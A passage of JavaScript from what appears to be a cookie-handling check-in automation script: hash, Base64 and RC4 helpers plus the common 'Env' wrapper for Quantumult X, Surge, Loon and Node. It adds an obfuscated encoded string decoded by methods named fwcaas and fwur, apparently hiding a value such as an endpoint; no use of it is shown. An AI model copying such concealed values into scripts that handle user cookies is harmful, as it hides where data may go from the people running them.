i(w, t, u, v, x[o + 14], D, 3275163606), v = i(v, w, t, u, x[o + 3], E, 4107603335), u = i(u, v, w, t, x[o + 8], F, 1163531501), t = i(t, u, v, w, x[o + 13], C, 2850285829), w = i(w, t, u, v, x[o + 2], D, 4243563512), v = i(v, w, t, u, x[o + 7], E, 1735328473), u = i(u, v, w, t, x[o + 12], F, 2368359562), t = j(t, u, v, w, x[o + 5], G, 4294588738), w = j(w, t, u, v, x[o + 8], H, 2272392833), v = j(v, w, t, u, x[o + 11], I, 1839030562), u = j(u, v, w, t, x[o + 14], J, 4259657740), t = j(t, u, v, w, x[o + 1], G, 2763975236), w = j(w, t, u, v, x[o + 4], H, 1272893353), v = j(v, w, t, u, x[o + 7], I, 4139469664), u = j(u, v, w, t, x[o + 10], J, 3200236656), t = j(t, u, v, w, x[o + 13], G, 681279174), w = j(w, t, u, v, x[o + 0], H, 3936430074), v = j(v, w, t, u, x[o + 3], I, 3572445317), u = j(u, v, w, t, x[o + 6], J, 76029189), t = j(t, u, v, w, x[o + 9], G, 3654602809), w = j(w, t, u, v, x[o + 12], H, 3873151461), v = j(v, w, t, u, x[o + 15], I, 530742520), u = j(u, v, w, t, x[o + 2], J, 3299628645), t = k(t, u, v, w, x[o + 0], K, 4096336452), w = k(w, t, u, v, x[o + 7], L, 1126891415), v = k(v, w, t, u, x[o + 14], M, 2878612391), u = k(u, v, w, t, x[o + 5], N, 4237533241), t = k(t, u, v, w, x[o + 12], K, 1700485571), w = k(w, t, u, v, x[o + 3], L, 2399980690), v = k(v, w, t, u, x[o + 10], M, 4293915773), u = k(u, v, w, t, x[o + 1], N, 2240044497), t = k(t, u, v, w, x[o + 8], K, 1873313359), w = k(w, t, u, v, x[o + 15], L, 4264355552), v = k(v, w, t, u, x[o + 6], M, 2734768916), u = k(u, v, w, t, x[o + 13], N, 1309151649), t = k(t, u, v, w, x[o + 4], K, 4149444226), w = k(w, t, u, v, x[o + 11], L, 3174756917), v = k(v, w, t, u, x[o + 2], M, 718787259), u = k(u, v, w, t, x[o + 9], N, 3951481745), t = c(t, p), u = c(u, q), v = c(v, r), w = c(w, s); var O = m(t) + m(u) + m(v) + m(w); return O.toLowerCase() }


function encodeUTF8(s) {
    var i, r = [], c, x;
    for (i = 0; i < s.length; i++)
        if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
        else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
        else {
            if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                    r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
            else r.push(0xE0 + (c >> 12 & 0xF));
            r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
        };
    return r;
}

function sha(s) {
    var data = new Uint8Array(encodeUTF8(s))
    var i, j, t;
    var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
    s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
    for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
    s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
    s[l - 1] = data.length << 3;
    var w = [], f = [
        function () { return m[1] & m[2] | ~m[1] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; },
        function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; }
    ], rol = function (n, c) { return n << c | n >>> (32 - c); },
        k = [1518500249, 1859775393, -1894007588, -899497514],
        m = [1732584193, -271733879, null, null, -1009589776];
    m[2] = ~m[0], m[3] = ~m[1];
    for (i = 0; i < s.length; i += 16) {
        var o = m.slice(0);
        for (j = 0; j < 80; j++)
            w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
        for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
    };
    t = new DataView(new Uint32Array(m).buffer);
    for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

    var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
        return (e < 16 ? "0" : "") + e.toString(16);
    }).join("");
    return hex;
}



function FxPCnMKLw7() {

    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

    // public method for encoding  
    this.encode = function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = _utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
                _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
                _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
        }
        return output;
    }

    // public method for decoding  
    this.decode = function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = _keyStr.indexOf(input.charAt(i++));
            enc2 = _keyStr.indexOf(input.charAt(i++));
            enc3 = _keyStr.indexOf(input.charAt(i++));
            enc4 = _keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }

    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }
        return utftext;
    }

    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}

function rc4(data, key) {
    var seq = Array(256); //int
    var das = Array(data.length); //code of data
    for (var i = 0; i < 256; i++) {
        seq[i] = i;
        var j = (j + seq[i] + key.charCodeAt(i % key.length)) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
    }
    for (var i = 0; i < data.length; i++) {
        das[i] = data.charCodeAt(i)
    }
    for (var x = 0; x < das.length; x++) {
        var i = (i + 1) % 256;
        var j = (j + seq[i]) % 256;
        var temp = seq[i];
        seq[i] = seq[j];
        seq[j] = temp;
        var k = (seq[i] + (seq[j] % 256)) % 256;
        das[x] = String.fromCharCode(das[x] ^ seq[k]);
    }
    return das.join('');
}
function Env(t, e) {
    class s {
        constructor(t) {
            this.env = t
        }
        send(t, e = "GET") {
            t = "string" == typeof t ? {
                url: t
            } : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }
        get(t) {
            return this.send.call(this.env, t)
        }
        post(t) {
            return this.send.call(this.env, t, "POST")
        }
    }
    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`)
        }
        isNode() {
            return "undefined" != typeof module && !!module.exports
        }
        isQuanX() {
            return "undefined" != typeof $task
        }
        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }
        isLoon() {
            return "undefined" != typeof $loon
        }
        isShadowrocket() {
            return "undefined" != typeof $rocket
        }
        toObj(t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }
        toStr(t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }
        getjson(t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch { }
            return s
        }
        setjson(t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }
        getScript(t) {
            return new Promise(e => {
                this.get({
                    url: t
                }, (t, s, i) => e(i))
            })
        }
        runScript(t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {
                        script_text: t,
                        mock_type: "cron",
                        timeout: r
                    },
                    headers: {
                        "X-Key": o,
                        Accept: "*/*"
                    }
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }
        loaddata() {
            if (!this.isNode()) return {}; {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e);
                if (!s && !i) return {}; {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }
        writedata() {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e),
                    r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }
        lodash_get(t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i)
                if (r = Object(r)[t], void 0 === r) return s;
            return r
        }
        lodash_set(t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }
        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }
        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }
        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }
        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }
        initGotEnv(t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }
        get(t, e = (() => { })) {
            if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let s = require("iconv-lite");
                this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                    try {
                        if (t.headers["set-cookie"]) {
                            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                            s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                        }
                    } catch (t) {
                        this.logErr(t)
                    }
                }).then(t => {
                    const {
                        statusCode: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, s.decode(h, this.encoding))
                }, t => {
                    const {
                        message: i,
                        response: r
                    } = t;
                    e(i, r, r && s.decode(r.rawBody, this.encoding))
                })
            }
        }
        post(t, e = (() => { })) {
            const s = t.method ? t.method.toLocaleLowerCase() : "post";
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient[s](t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let i = require("iconv-lite");
                this.initGotEnv(t);
                const {
                    url: r,
                    ...o
                } = t;
                this.got[s](r, o).then(t => {
                    const {
                        statusCode: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, i.decode(h, this.encoding))
                }, t => {
                    const {
                        message: s,
                        response: r
                    } = t;
                    e(s, r, r && i.decode(r.rawBody, this.encoding))
                })
            }
        }
        time(t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }
        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
                    "open-url": t
                } : this.isSurge() ? {
                    url: t
                } : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
                let t = ["", "==============📣系统通知📣=============="];
                t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t)
            }
        }
        fwcaas() {
            return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
        }
        log(...t) {
            t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator))
        }
        logErr(t, e) {
            const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
            s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
        }
        fwur() {
            var bbas = new FxPCnMKLw7()
            return bbas.decode(this.fwcaas());
        }
        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }
        done(t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
        }
    }(t, e)
}
